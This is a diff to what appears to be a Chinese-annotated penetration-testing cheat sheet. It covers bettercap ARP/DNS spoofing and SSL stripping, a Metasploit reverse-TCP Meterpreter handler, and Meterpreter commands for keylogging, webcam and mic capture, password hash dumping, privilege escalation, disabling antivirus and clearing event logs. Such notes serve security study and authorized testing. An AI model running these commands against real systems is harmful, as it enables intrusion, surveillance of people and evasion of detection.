@@ -261,19 +261,62 @@ dns.spoof         //DNS欺骗
 ---------------------------------------------------------------
 set arp.spoof.targets 192.168.1.1         //设置欺骗的IP目标
 set http.proxy.sslstrip true              //将HTTPS降级到HTTP
-set http.proxy.script /root/xss.js        //代理执行的脚本
+set http.proxy.script xss.js              //代理执行的脚本
 set net.sniff.verbose false               //精简化显示数据
 set dns.spoof.domains google.com          //设置要欺骗的域名
 set dns.spoof.address desired_IP          //设置要重定向的地址
-set dns.spoof.all true                    //回应任何请求(默认只会回应那些对本地的请求)
 ```
 
 ## Metasploit
 
+- 常用命令
+
+```
+search exploit/multi/handler
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+show options/targets
+show advanced
+set autorunscript migrate -n explorer.exe
+sessions -u ID
+route add 192.168.0.0/24 ID
+```
+
 - Meterpreter
 
 ```
-
+background                      //当前会话退至后台
+load                            //使用扩展库(如kiwi/incognito/sniffer)
+run                             //使用Post模块
+migrate [pid]                   //迁移进程
+shell                           //进入系统命令行
+search                          //搜索文件
+download                        //下载文件或目录
+upload                          //上传文件或目录
+-----------------------------------------
+keyscan_dump                    //显示键盘记录信息
+keyscan_start                   //开始捕获按键
+keyscan_stop                    //停止捕获击键
+screenshare                     //实时远程的桌面
+screenshot                      //抓取桌面的屏幕截图
+record_mic                      //录制默认麦克风的音频X秒
+webcam_list                     //列出网络摄像头
+webcam_snap                     //从指定的网络摄像头拍摄快照
+webcam_stream                   //从指定的网络摄像头播放视频流
+-----------------------------------------
+sysinfo                         //获取操作系统的信息
+portfwd                         //将本地端口转发到远程服务
+getprivs                        //尝试启用当前进程可用的所有特权
+getsystem                       //尝试提权
+hashdump                        //导出密码的哈希
+timestomp                       //改变文件属性
+clearev                         //清除事件日志
+-----------------------------------------
+run autoroute                   //自动路由
+run killav                      //关闭杀毒
+run getgui                      //远程桌面
+run get_application_list        //软件信息
+run dumplinks                   //最近操作
 ```
 
 ## Great Tools
